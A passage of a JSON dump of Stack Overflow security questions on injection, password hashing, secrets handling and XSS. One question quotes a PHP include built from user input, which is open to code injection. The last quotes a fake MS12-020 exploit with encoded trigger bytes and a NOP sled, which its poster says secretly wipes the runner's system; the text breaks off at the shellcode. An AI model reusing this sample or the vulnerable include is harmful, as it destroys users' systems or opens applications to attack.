data integrity","body":"<p>Scenario: web based text game</p>\n\n<ol>\n<li>Player A sends request to send 10,000 credits to player B (this request takes 20ms to complete). </li>\n<li>3ms after sending first request (which is still being processed) player A sends another request to battle player C, this request takes 100ms to complete.</li>\n</ol>\n\n<p>What's happening, in step 1 an app removes credits from player A, gives them to player B, but before this is persisted in the db, second request comes, loads state still showing 10k in an account of player A and overwrites correct state from request 1 (0 credits) with 10k + battle loot from step 2. Result: player A and B both have now 10k in their accounts, the money just doubled.</p>\n\n<p>What can be done to protect against this? This is hypothetical scenario to show the problem, for above scenario <code>account=account+loot</code> sql would do, but I'm looking for solution that works with all data types.</p>\n"},{"tags":["c#","security","validation","razor","webmatrix"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":58,"score":2,"question_id":12826020,"title":"WebMatrix SQL injection & XSS concerns after paramaterizing queries","body":"<p>I have a simple question that concerns security in WebMatrix razor (C#)</p>\n\n<p>I (for a very brief period of time) considered using character checking to help validate forms to combat SQL injection, however, after realizing that parameterizing queries is the best way to combat this, I have since commented out this check which looks something like this:</p>\n\n<pre><code>    foreach(char c in POIName)\n    {\n        if(c=='\\'' || c=='$' || c=='\\\"' || c=='&amp;' || c=='%' || c=='@' || c=='-' || c=='&lt;' || c=='&gt;')\n        {\n            errorMessage = \"You have entered at least one invalid character in the \\\"POI Name\\\" field. Invalid characters are: [\\'], [\\\"], [&amp;], [$], [@], [-], [&lt;], [&gt;], and [%]\";\n        }\n    }\n</code></pre>\n\n<p>Now, my question is this:\nShould I remove lines like these entirely, as they are not needed (to allow maximum user freedom in textareas etc.) or should there still be some character checking specific to WebMatrix (or not specific to it for that matter).</p>\n\n<p>Perhaps not allow \"@\" or \";\" or \"&lt;\" or \">\"??</p>\n\n<p>From what I understand paramaterizing the queries (as I have) auto escapes harmful characters and re-wraps the whole thing as a string (or something like that anyway, lol), and my database has proven impervious to any of the SQL injection attacks I have thrown at it.</p>\n\n<p>I guess I am concerned because I am not sure if razor can be effected somehow or if I should worry about XSS (no I am not a blog or anything that should ever accept html tags or even angle brackets of any kind).</p>\n\n<p>Sorry if this question is kind of all over the place, but I don't know where else to turn to find as definitive of an answer as Stack Overflow usually provides (e.g., I trust this community much more than a few Google searches, which I assure I have tried before posting).</p>\n\n<p>Thanks for any help!</p>\n"},{"tags":["php","security",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":269,"score":0,"question_id":9412997,"title":"Codeigniter & disallowed key characters issue with my htaccess","body":"<p>I have setup an htaccess rule (see below)</p>\n\n<pre><code>RewriteRule ^images/(.*) http://www.mysite.com [R=301,L]\n</code></pre>\n\n<p>My intention is that any of the following links will be redirected to site.com the problem is the question mark character (?) as this causes an 'Disallowed key characters' error in Codeigniter framework. I could modify the permitted characters in the config file but this is not recommended for security purposes.</p>\n\n<p>The links I aim to redirect looks like the following..</p>\n\n<pre><code>http://www.site.com/images/flash/main.swf?config=/flash/flash_output/133/location.htm\n</code></pre>\n\n<p>Can anyone suggest a workaround that doesn't involve <a href=\"http://stackoverflow.com/q/9413223/367456\">changing the permitted characters in the config</a>, or is this the only workable option?</p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":43,"score":-2,"question_id":12825903,"title":"salted password","body":"<p>I'm a novice php programmer, and with the help of PHP books and tutorials I recently started to learn about salted passwords. </p>\n\n<p>What I would like to do is this: </p>\n\n<p>1º A random generated salt for each new user; (done) </p>\n\n<p>2º A SHA512 hash; (done) </p>\n\n<p>3º Send to my database my treated password and salt; (done) </p>\n\n<p>4º Validating when users login; </p>\n\n<p>5º In the validation login system if the user fails 3 attempts is kicked out for a certain time period.  </p>\n\n<p>Does anyone knows a good php code, book or tutorial for the 4º and 5º steps? </p>\n\n<p>Thanks in advance for the replies... </p>\n"},{"tags":["c#","web-services","security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":181,"score":1,"question_id":9568414,"title":"C# web service password in the request to be encrypted","body":"<p>I am working on the web service.  A user is going to be able to create a user account using a form on different asp.net project. So when the user enters the password information I need to store that encrpted in a database.  But now when the user sends the user credentials through for a web services then I need to the user to send that password encrpted for security purposes. </p>\n\n<p>Now how can we both have the same ecrption procedure so that I will be able to validate the request.</p>\n"},{"tags":["security","google-app-engine","rest"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12819784,"title":"How to make sure that my mobile app back end is not called by other app?","body":"<p>I'm starting to have a look at mobile development and precisely Android Development.</p>\n\n<p>The mobile App will be mainly UI, and all the business will occur on a web application hosted by Google App Engine (the communicaiton will be in rest I think).</p>\n\n<p>How can I make sure that my rest api is not called by any other software/app ? Because anyone can sniff the network, get my api calls, then forge theirs. That shouldn't be a problem if my api was well designed and flawless, but that's certainly not gonna be the case.</p>\n\n<ul>\n<li><p>Login/Password is not a solution because it can be sniffed</p></li>\n<li><p>SSL communication also because the user can use the same certificate for his own app</p></li>\n</ul>\n\n<p>I think that there is not perfect way, but only partial solution (like hiding the certificate with any ugly technique so even the decompilation wouldn't help).</p>\n\n<p>EDIT :</p>\n\n<p>I found this : <a href=\"http://stackoverflow.com/questions/9823391/how-to-make-sure-api-requests-come-from-our-mobile-ios-android-app\">How to make sure API requests come from our mobile (ios/android) app?</a></p>\n\n<p>But I wonder if there is any already existing way of doing this in Http or App Engine or anything else. I don't really like to code security code myself.</p>\n\n<p>Rémi</p>\n"},{"tags":["security","encryption","cryptography"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":114,"score":1,"question_id":1988513,"title":"Revealing the length of the plain-text?","body":"<p>If I have just encrypted some plain-text into cipher-text with CBC and Rijndael, is it insecure to tell the world that the original plain-text had a length of x bytes? It seems that it's always the same as the length of the cipher-text, so, I think it does not matter, but are there some block modes or ciphers where it does matter?</p>\n"},{"tags":["c#",".net","security","encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":144,"score":0,"question_id":2739981,"title":"Implementing a program that generates non-transferable licences","body":"<p>I'm taking a security class and am required to implement a licensing server that sends licenses that are non-transferable. I have no idea how to do that. Could you please give me some of your ideas?</p>\n"},{"tags":["asp.net","security"],"answer_count":3,"favorite_count":3,"up_vote_count":2,"down_vote_count":1,"view_count":347,"score":1,"question_id":5063769,"title":"Are there any Asp.net security tools and/or frameworks?","body":"<p>As per the increasing security threats, my site needs extreme care in terms of security in all aspects. I know asp.net has built in some security measures (Anti-forgery token, cross-site scripting, authentication, roles), but that is just not enough.</p>\n\n<p>I need a tool to test <strong>all possible</strong> security threats (Brute-force attacks, .... IP location, browser info ...  )\nand a framework (open source is better) that handles all these concerns and let you build upon.</p>\n\n<p><strong>EDIT</strong>\nSo to narrow a bit, my primary concern is protecting the \"login\" page from all possible threats.</p>\n\n<p>Help is highly appreciated !</p>\n\n<p>P.S. If someone can not answer, please skip the question and spare the comments and negative votes. Thanks.</p>\n"},{"tags":["security","validation","coldfusion","coldfusion-8","sanitize"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12810456,"title":"Is there anything that provides the kind of support PHP's filter_var does in ColdFusion?","body":"<p>I've found <a href=\"http://php.net/manual/en/function.filter-var.php\" rel=\"nofollow\">filter_var</a> to be <strong>extremely</strong> useful in validating and sanitizing user input with PHP, but I've yet to find anything even remotely as convenient in ColdFusion (more specifically, CF8).</p>\n\n<p>Obviously I can hack together something using <a href=\"http://livedocs.adobe.com/coldfusion/8/htmldocs/functions_m-r_35.html#135742\" rel=\"nofollow\">REReplace</a>, but that would take significantly more time to code up and would be much uglier than using the pre-defined filters available in PHP. Is there a more efficient way or do I just need to bite the bullet?</p>\n"},{"tags":["java","security","static-analysis"],"answer_count":4,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":637,"score":6,"question_id":1246762,"title":"Security static analysis tools","body":"<p>I'm familiar with the typical usages of tools like FindBugs and PMD as they relate to finding sub-optimal code.  </p>\n\n<p>What I'm not familiar with are the static analysis tools designed specifically for finding <strong>security flaws</strong> in code.  e.g. sql-injection, spoofing, and other security flaws.</p>\n\n<p>What kinds of experiences and recommendations do people have with these tools?</p>\n"},{"tags":["asp.net-mvc-3","wcf","security","azure","webrole"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12820368,"title":"Azure: security between web roles","body":"<p>In Azure, if you choose to use internal endpoint (instead of input endpoint), https is not an option. http &amp; tcp are the only options. Does it mean internal endpoint is 100% secure and you don't need encryption. </p>\n\n<p>Then it comes to another question. If i choose to use input endpoint between mvc application and wcf service. Is it really necessary to have https between them? Is it OK if i have 2 input endpoints for wcf. One with http on port 80, which is supposed to be used by mvc application. Another with https on port 443, which can be used by somebody else. (not our own application) </p>\n"},{"tags":["ruby-on-rails","security","heroku","jruby","cloudbees"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12732818,"title":"When trying to configure Rails Ruby or jRuby app the secret key is visible in the YAML file. Is there a gem that will provide this at runtime?","body":"<p>There are lots of secrets that apps have that need to be secured in production when running in public cloud and PaaS environments.  Common one is database.yml entries for mysql user and password, but there can be others.  Your Google App secret, facebook app secret,... the list goes on.  There are no clear way of securing these essentially configuration parameters.  You <em>DO NOT</em> want to put these in a file as there is no guarantee who will have access to it.</p>\n\n<p>In Heroku you can specify things via environment variables.  In Cloudbees (a Java PaaS) you can specify these as Java System properties.  Both Heroku and Cloudbees have a commandline utility for uploading this configuration parameters but there is no support for making this work both in development and production easily.</p>\n\n<p>Question is how do you configure your parameters so that you can develop easily in development but not have the production secret be available in development</p>\n\n<p>Ideally there would be a gem that will work in ruby and jruby environment and PaaS that will allow me to specify me secrets in a YML file that has development settings in development but actual production secrets pulled in from <code>ENV</code> or <code>java.lang.System.getProperty</code>.</p>\n\n<pre><code>##\n# file: config/secure_config.yml\ndevelopment:\n  db:\n    user_id: 'dev_mysql_user'\n    password: 'my_dev_pwd'\n  google:\n    app_id: 'xxxxx' # this is the secret for the dev app so it can be visible\n    app_secret: 'xxxxx'\n# ...\nproduction:\n  db:\n    user_id: &lt;%= get_secure_config %&gt;\n    password: &lt;%= get_secure_config %&gt;\n  google:\n    app_id: &lt;%= get_secure_config %&gt;\n    app_secret: &lt;%= get_secure_config %&gt;\n</code></pre>\n\n<p>Where the get_secure_config helper gets the value from <code>ENV</code> or <code>java.lang.System.getProperty</code> in case of Ruby or jRuby.  The finally you can use them in your app as needed.  For example in database.yml or in the devise code to authenticate using google.</p>\n\n<pre><code># config/database.yml\n# ...\nproduction:\n  adapter: mysql2\n  username: &lt;%= SecureConfig.db.user_id %&gt;\n  password: &lt;%= SecureConfig.db.password %&gt;\n</code></pre>\n\n<p>And then for extra coolness the gem should also give me an executable that allows me to push the config to my PaaS</p>\n\n<pre><code>~/work/myproject&gt; bundle exec secure_config -push_to_heroku\n</code></pre>\n\n<p>or</p>\n\n<pre><code>~/work/myproject&gt; bundle exec secure_config -push_to_cloudbees\n</code></pre>\n"},{"tags":["php","html","forms","security"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12818698,"title":"Anything wrong with storing form values as Session variables?","body":"<p>Is there any reason I shouldn't store form data like so? Is this an OK practice? I have some things like our business email address that I don't want visible on the client side.</p>\n\n<pre><code>&lt;input type=\"hidden\" name=\"amount\" id=\"amount\" value=\"&lt;?php echo $_SESSION['amount']; ?&gt;\"&gt;\n&lt;input type=\"hidden\" name=\"item_name\" value=\"&lt;?php echo $_SESSION['plan_name']; ?&gt;\"&gt;\n&lt;input type=\"hidden\" name=\"p3\" value=\"&lt;?php echo $_SESSION['period']; ?&gt;\"&gt;\n&lt;input type=\"hidden\" name=\"my_email\" value=\"&lt;?php echo $_SESSION['my_email']; ?&gt;\"&gt;\n&lt;input type=\"src\" name=\"t3\" value=\"&lt;?php echo $_SESSION['recurring']; ?&gt;\"&gt;\n</code></pre>\n\n<p>I forgot to mention that the fields are empty on page load. They get populated by an AjAX return data.</p>\n"},{"tags":["windows","security","unix","operating-system"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":58,"score":-4,"question_id":12818211,"title":"How UNIX is more secured than Windows?","body":"<p>How the UNIX type OS is said to be more secured than Windows? Why UNIX is preferred for Web servicing rather than Windows?</p>\n"},{"tags":["javascript","json","security","xss","urlencode"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":117,"score":4,"question_id":11400990,"title":"Is there any XSS threat while having JSON encoded in the URL?","body":"<p>In order to have an URL friendly application I'm storing it's context has a JSON in URL, which gives something like : </p>\n\n<pre><code>http://mysite.dev/myapppage/target#?context={%22attr1%22%3A{%22target_id-0%22%3A{%22value%22%3A%223%22%2C%22label%22%3A%22Hello%22}}}\n</code></pre>\n\n<p>Which encode a basic context :</p>\n\n<pre><code>{\n\"attr1\":\n    {\n    \"target_id-0\":\n        {\n        \"value\": \"3\",\n        \"label\": \"Hello\"\n        }\n    }\n}\n</code></pre>\n\n<p>I'm serializing my object with :</p>\n\n<pre><code>JSON.stringify(context)\n</code></pre>\n\n<p>I'm deserializing it with :</p>\n\n<pre><code>var hashParamsElements = window.location.toString().split('?');\nhashParamsElements.shift(); // we just skip the first part of the url\nvar hashParams = $.deparam(hashParamsElements.join('?'));\nvar contextString = hashParams.context;\nvar context = JSON.parse(contextString);\n</code></pre>\n\n<p>The context is only stored to read variables, there's no evaluated code in it. Can someone tell me whether or not it's XSS safe ?</p>\n\n<p>If there's a threat : how can I avoid it ?</p>\n"},{"tags":["java","c","security","encryption","client-server"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":5,"view_count":128,"score":-4,"question_id":12676088,"title":"Client server encryption over multiple programming languages","body":"<p>I'm writing a server program in C and a client in Java. I have got nearly everything I want working correctly but am completely stuck on encryption. As this is for a nuclear power station they want all communications encrypted. I know how to make RSA and AES keys in both the languages, but does anyone know of a way of making either Java or C encryption keys and loading them in the other language? Trying to avoid using JNI.</p>\n\n<p>Any advice would be much appreciated. Cheers</p>\n"},{"tags":["javascript","jquery","security","cakephp"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":143,"score":1,"question_id":11694865,"title":"Black Holed Request Cakephp","body":"<p>On my index page I have check boxes in each row of my table.</p>\n\n<p>To edit selected items, I use javascript/jquery to grab the class of the checkboxes, build an array of the ids and then post it to the edit selected method in my controller.</p>\n\n<p>Now, this all works perfectly, but when Security in enabled in my App Controller, my post gets black holed and the array is not posted.</p>\n\n<p>Here is my index.ctp file:</p>\n\n<pre><code>&lt;table id=\"indexTable\"&gt;\n    &lt;thead&gt;&lt;tr&gt;\n        &lt;th&gt; &lt;?php echo $this-&gt;Form-&gt;checkbox('select_all', array('value' =&gt; 'select_all')); ?&gt; &lt;/th&gt;\n        &lt;th&gt; &lt;?php echo $this-&gt;Paginator-&gt;sort('id', 'ID'); ?&gt; &lt;/th&gt;\n        &lt;th&gt; &lt;?php echo $this-&gt;Paginator-&gt;sort('name', 'Name'); ?&gt; &lt;/th&gt;\n        &lt;th&gt;Auto Offset  &lt;/th&gt;  &lt;th&gt;UTC Offset Sec  &lt;/th&gt;  &lt;th&gt;In Month  &lt;/th&gt;\n        &lt;th&gt;In Week      &lt;/th&gt;  &lt;th&gt;In Dow          &lt;/th&gt;  &lt;th&gt;In Hour   &lt;/th&gt;  &lt;th&gt;Out Month   &lt;/th&gt;\n        &lt;th&gt;Out Week     &lt;/th&gt;  &lt;th&gt;Out Dow         &lt;/th&gt;  &lt;th&gt;Out Hour  &lt;/th&gt;  &lt;th&gt;Offset Sec  &lt;/th&gt;\n        &lt;th&gt;DST Ref      &lt;/th&gt;  &lt;th&gt;Actions      &lt;/th&gt;\n    &lt;/tr&gt;&lt;/thead&gt;\n\n    &lt;tbody&gt;\n\n&lt;?php\n$this-&gt;Form-&gt;create('LocalClock');\nforeach($localClocks as $LocalClock) { ?&gt;\n        &lt;tr&gt;\n            &lt;td&gt;  &lt;?php echo $this-&gt;Form-&gt;checkbox('LocalClocks'.$LocalClock['LocalClock']['id'], array('value' =&gt; $LocalClock['LocalClock']['id'], 'hiddenField' =&gt; false));?&gt;  &lt;/td&gt;\n            &lt;td&gt;  &lt;?php echo $LocalClock['LocalClock']['id']; ?&gt;              &lt;/td&gt;\n            &lt;td&gt;  &lt;?php echo $LocalClock['LocalClock']['name']; ?&gt;            &lt;/td&gt;\n            &lt;td&gt;  &lt;?php echo $LocalClock['LocalClock']['auto_offset']; ?&gt;     &lt;/td&gt;\n        &lt;/tr&gt;\n&lt;?php } ?&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n\n&lt;/div&gt;\n\n&lt;!-- This &lt;div&gt; contains all the actions that can be performed on the Local Clocks. --&gt;\n&lt;div&gt;\n    &lt;p&gt;\n\n        &lt;span style=\"float: left\"&gt;\n            &lt;?php echo $this-&gt;Html-&gt;link(__('Edit All Items'), array('action' =&gt; 'editAll'), array('class' =&gt; 'link'));?&gt; &amp;nbsp;&amp;nbsp;\n        &lt;/span&gt;\n\n        &lt;span style=\"float: left\"&gt;\n            &lt;?php echo $this-&gt;Html-&gt;link(__('Edit Selected Items'), array('action' =&gt; 'lceditSelected'), array('class' =&gt; 'general_dialog'));?&gt; &amp;nbsp;&amp;nbsp;\n        &lt;/span&gt;\n\n        &lt;span style=\"float: right\"&gt;\n            &lt;?php echo $this-&gt;Html-&gt;link(__('Delete Selected Items'), array('action' =&gt; 'deleteSelected'), array('class' =&gt; 'general_dialog'));?&gt; &amp;nbsp;&amp;nbsp;\n        &lt;/span&gt;\n    &lt;?php $this-&gt;Form-&gt;end(); ?&gt;\n\n    &lt;/p&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>I took out some unimportant stuff.  The problem is with my edit selected and delete selected functions.</p>\n\n<p>Here is the javascript code that waits for their click and then builds the array to post to the controller action:</p>\n\n<pre><code>$('.general_dialog').live('click', function()\n{\n    $.ajaxSetup({ async: false });\n\n        var $selDialog = $(\"#general_dialog\").dialog(\n        {\n            autoOpen: false,\n            modal: true,\n        });\n\n        var postInfo = $('#LocalClockIndexForm').serialize();\n        $.ajax({\n        url: $(this).attr('href'),\n        type: \"post\",\n        data: postInfo,\n        success: function (response)\n        {\n            alert('success');\n        },\n        error: function()\n        {\n            alert(\"failed\");\n        }\n    });\n        $selDialog.load($(this).attr('href'), function ()\n        {\n            $selDialog.dialog('open');\n        });\n    return false; // Ensure the controller does not redirect to the actual edit page\n});\n</code></pre>\n\n<p>Any help on how to get it to work without getting black holed would be greatly appreciated.</p>\n\n<p>Thanks in advance</p>\n\n<p>------------------------------------------EDIT----------------------------------------------\nI added <code>$this-&gt;Form-&gt;create('LocalClock')</code> and <code>$this-&gt;Form-&gt;end()</code> to the table and I switched the $.post() to and $.ajax() call.</p>\n\n<p>If I send the serialised form, I don't get a black hole, but when I look at the data posted, it does not include any of the check box ids.</p>\n"},{"tags":["python","django","security","urlfetch","malicious"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":50,"score":3,"question_id":12815448,"title":"URL fetch: prevent abuse, mailcious urls etc. in python/django","body":"<p>I'm building a webpage featuring a very much a-like the facebook wall/newsfeed. Registered users (or through Facebook-connect, google auth) can submit urls. At the moment, I'm taking these URLs and use urllib2 to fetch the content of the URL and search for relevant information like og:properties, HTML title-tag and perheps some -tags for images.</p>\n\n<p>Now, I understand that I'm putting my server at risk when I'm letting users feed my server with URLs to open.</p>\n\n<p>My question is how high the risk is? What standard security checks can I make?</p>\n\n<p>As for now, I am simply opening the url without any \"active\" protection because I don't know what to check for.</p>\n\n<p>And what about storing fetched content into the database. Does django have built-in protection against SQL-injections?</p>\n\n<p>Thank you!</p>\n"},{"tags":["security","jsf-1.2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12815699,"title":"Restricting access to JSF files under WEB-INF : Navigation not happening","body":"<p>I have JSF 1.2 based <code>Servlet</code>. I want to restrict access to pages inside my <code>Servlet</code> by placing under <code>WEB-INF</code>. My post might seem to be duplicate of <a href=\"http://stackoverflow.com/questions/3512234/jsf-files-inside-web-inf-directory-model-2-pattern\">this</a> post. But, I tried the options suggested by BalusC and my questions are based on those answers.</p>\n\n<p>\"Restricting access\" means, suppose there are two JSF pages, user should be able to visit 2nd JSF page only from 1st JSF page. User should not see 2nd JSF page by hitting http:/myDomain/mySecondPage.jsf</p>\n\n<p>Based on the answers of BalusC in <a href=\"http://stackoverflow.com/questions/3512234/jsf-files-inside-web-inf-directory-model-2-pattern\">this</a> post, my questions are below</p>\n\n<p>I have mapped the <code>FacesServlet</code> on *.xhtml instead of *.jsf (Option 1). And I have the navigation rule in <code>faces-config.xml</code> like below. </p>\n\n<pre><code>    &lt;navigation-case&gt;\n      &lt;from-outcome&gt;success&lt;/from-outcome&gt;\n      &lt;to-view-id&gt;/WEB-INF/success.xhtml&lt;/to-view-id&gt;\n    &lt;/navigation-case&gt;\n</code></pre>\n\n<p>This didnt work. Instead of <code>/WEB-INF/success.xhtml</code> , I changed to <code>success.jsf</code>. This also didnt work.\nHow to handle navigation rule in this case?</p>\n\n<p>I tried Option 2. Even after putting <code>&lt;security-constraint&gt;</code> entry in web.xml, am able to hit http:/myDomain/mySecondPage.jsf and access it. Where am I going wrong?</p>\n\n<p><a href=\"http://stackoverflow.com/questions/3512234/jsf-files-inside-web-inf-directory-model-2-pattern\">This</a> post seems to tell that one cannot view the source of xhtml page if placed under <code>WEB-INF</code>. But, restricting access to me is what I have said above. How that can be achieved?</p>\n\n<p><a href=\"http://www.coderanch.com/t/212515/JSF/java/hiding-pages-behind-WEB-INF\" rel=\"nofollow\">This</a> post suggests to navigate pages in <code>Servlet controller</code>. But, I have many navigation rules defined in <code>faces-config.xml</code> which I dont want to change now. </p>\n\n<p>When a user directly hits mySecondPage.jsf without coming from 1st JSF page, he should be shown some user friendly Sorry message. There is no authentication involved in my web application. </p>\n"},{"tags":["php","security","injection"],"answer_count":9,"favorite_count":6,"up_vote_count":10,"down_vote_count":0,"view_count":11019,"score":10,"question_id":38875,"title":"Best way to avoid code injection in PHP","body":"<p>My website was recently attacked by, what seemed to me as, an innocent code:</p>\n\n<pre><code>&lt;?php\n  if ( isset( $ _GET['page'] ) ) {\n    include( $ _GET['page'] . \".php\" );\n  } else {\n    include(\"home.php\");\n  }\n?&gt;\n</code></pre>\n\n<p>There where no SQL calls, so I wasn't afraid for SQL Injection. But, apparently, SQL isn't the only kind of injection.</p>\n\n<p>This website has an explanation and a few examples of avoiding code injection: <a href=\"http://www.theserverpages.com/articles/webmasters/php/security/Code_Injection_Vulnerabilities_Explained.html\" rel=\"nofollow\">http://www.theserverpages.com/articles/webmasters/php/security/Code_Injection_Vulnerabilities_Explained.html</a></p>\n\n<p>How would you protect this code from code injection?</p>\n"},{"tags":["security","website","subdomain"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12811725,"title":"Change my present website into secure web","body":"<p>How can I turn my website into a secure website. I want it to run on secure webpage such as Facebook most apps run on secure page. </p>\n\n<p>I want to know if I have to buy new domain or I can do with my same domain or if there is some setting to do so? </p>\n\n<p>I have never worked with secure web.</p>\n\n<p>Or if there is some good secure provider etc etc kindly tell me.</p>\n"},{"tags":["c#","security","bcrypt"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12813782,"title":"Compare BCrypt-ed password from mobile app","body":"<p>I'd like to verify this with some security expert.</p>\n\n<p>I have a web app where I register users. I Bcrypt the pw with a unique salt for each user and store the hashed pw to the DB.</p>\n\n<p>I now need to authenticate user from a mobile app. I can't use ssl and I'd prefer to avoid passing passwords in clears between mobile and my web server. So before call the login method (via RESTful API) on the server, I'd prefer to BCrypt the pw on mobile and then pass it hashed to the server via API to compare.</p>\n\n<p>The point is that on the mobile I have to BCrypt with the same salt (as far as I know I cannot compare two BCrypted pw hashed with different salt). </p>\n\n<p><strong>So the question is: is it ok and safe to</strong></p>\n\n<ol>\n<li>Mobile asks the salt for user X to server (I get the first 22 chars plus offset from stored pw in DB)</li>\n<li>On mobile I BCrypt the pw with the salt got at point 1</li>\n<li>Finally mobile calls login(username, hashedpw) on server.</li>\n</ol>\n\n<p>As said all communications are over plain http, no SSL.</p>\n\n<p>Does this makes sense?</p>\n"},{"tags":["python","security","operating-system","exploit"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":251,"score":5,"question_id":11927424,"title":"Why does this Python code destroy my computer?","body":"<p>It claims to be MS12-020 exploit, and I tested this on my machine. Apparently, it seems to destroy the operating system that runs it.</p>\n\n<p>Looking just some parts of this code does not indicate any malicious code, so I asking for your help.</p>\n\n<p>What is it exactly doing, and how would I be able to recover the system?</p>\n\n<p>Edit: it does not destroy the machine targetted; it destroys the machine that runs it. I would get tons of information if I am to search what MS12-020 is!!!!</p>\n\n<h2>EDIT: DO NOT RUN THIS CODE. IT IS <code>rm -rf /</code> IN DISGUISE.</h2>\n\n<pre><code>#!/usr/bin/env python\n\n# rdpsmash.py\n# MS12-020 RDP exploit, remote code execution\n# Confirmed working on all pre-patch boxes, XP to 7\n#\n# Author: Verye\n\nimport struct\nimport socket\nimport sys\n\ntrigger =  \"\\x58\\x6c\\x64\\x47\\x6a\\x74\\x30\\x5a\\x67\\x43\\x67\\x79\\x6f\\x39\\x46\\xf1\"\ntrigger += \"\\x66\\x70\\x66\\x61\\x43\\x52\\x46\\x71\\x78\\x30\\x33\\x55\\x62\\x63\\x58\\x63\"\ntrigger += \"\\x47\\x34\\x33\\x65\\x62\\x41\\x4f\\x30\\x54\\x39\\x6f\\x4a\\x70\\x52\\x48\\x5a\"\ntrigger += \"\\x6b\\x38\\x6d\\x6b\\x4c\\x75\\x6b\\x30\\x50\\x6b\\x4f\\x6e\\x36\\x53\\x6f\\x6f\"\ntrigger += \"\\x79\\x4a\\x45\\x32\\x46\\x6f\\x71\\x6a\\x4d\\x34\\x48\\x77\\x72\\x73\\x65\\x73\"\ntrigger += \"\\x5a\\x37\\x72\\x69\\x6f\\x58\\x50\\x52\\x48\\x4e\\x39\\x76\\x69\\x4a\\x55\\x4c\"\ntrigger += \"\\x6d\\x32\\x77\\x69\\x6f\\x59\\x46\\x50\\x53\\x43\\x63\\x41\\x43\\x70\\x53\\x70\"\ntrigger += \"\\x53\\x43\\x73\\x50\\x53\\x62\\x63\\x70\\x53\\x79\\x6f\\x6a\\x70\\x35\\x36\\x61\"\ntrigger += \"\\x78\\x71\\x32\\x78\\x38\\x71\\x76\\x30\\x53\\x4b\\x39\\x69\\x71\\x4d\\x45\\x33\"\ntrigger += \"\\x58\\x6c\\x64\\x47\\x6a\\x74\\x30\\x5a\\x67\\x43\\x67\\x79\\x6f\\x39\\x46\\x32\"\ntrigger += \"\\x4a\\x56\\x70\\x66\\x31\\x76\\x35\\x59\\x6f\\x58\\x50\\x32\\x48\\x4d\\x74\\x4e\"\ntrigger += \"\\x4d\\x66\\x4e\\x7a\\x49\\x50\\x57\\x6b\\x4f\\x6e\\x36\\x46\\x33\\x56\\x35\\x39\"\ntrigger += \"\\x73\\x55\\x38\\x4d\\x37\\x71\\x69\\x69\\x56\\x71\\x69\\x61\\x47\\x6b\\x4f\\x6e\"\ntrigger += \"\\x36\\x36\\x35\\x79\\x6f\\x6a\\x70\\x55\\x36\\x31\\x7a\\x71\\x74\\x32\\x46\\x51\"\ntrigger += \"\\x78\\x52\\x43\\x70\\x6d\\x4f\\x79\\x4d\\x35\\x72\\x4a\\x66\\x30\\x42\\x79\\x64\"\ntrigger += \"\\x69\\x7a\\x6c\\x4b\\x39\\x48\\x67\\x62\\x4a\\x57\\x34\\x4f\\x79\\x6d\\x32\\x37\"\ntrigger += \"\\x41\" * 39\ntrigger += \"\\x42\\x44\\x6c\\x4c\\x53\\x6e\\x6d\\x31\\x6a\\x64\\x78\\x4c\\x6b\\x4e\\x4b\\x4e\"\ntrigger += \"\\x4b\\x43\\x58\\x70\\x72\\x69\\x6e\\x6d\\x63\\x37\\x66\\x79\\x6f\\x63\\x45\\x73\"\ntrigger += \"\\x74\\x4b\\x4f\\x7a\\x76\\x63\\x6b\\x31\\x47\\x72\\x72\\x41\\x41\\x50\\x51\\x61\"\ntrigger += \"\\x41\\x70\\x6a\\x63\\x31\\x41\\x41\\x46\\x31\\x71\\x45\\x51\\x41\\x4b\\x4f\\x78\"\ntrigger += \"\\x50\\x52\\x48\\x4c\\x6d\\x79\\x49\\x54\\x45\\x38\\x4e\\x53\\x63\\x6b\\x4f\\x6e\"\ntrigger += \"\\x36\\x30\\x6a\\x49\\x6f\\x6b\\x4f\\x70\\x37\\x4b\\x4f\\x4e\\x30\\x4e\\x6b\\x30\"\ntrigger += \"\\x57\\x69\\x6c\\x6b\\x33\\x4b\\x74\\x62\\x44\\x79\\x6f\\x6b\\x66\\x66\\x32\\x6b\"\ntrigger += \"\\x4f\\x4e\\x30\\x53\\x58\\x58\\x70\\x4e\\x6a\\x55\\x54\\x41\\x4f\\x52\\x73\\x4b\"\ntrigger += \"\\x4b\\x43\\x58\\x70\\x72\\x69\\x6e\\x6d\\x63\\x37\\x66\\x00\"\n\nnopsled = \"\\x90\" * 214\n\n#bindshell port 8888\nshellcode =  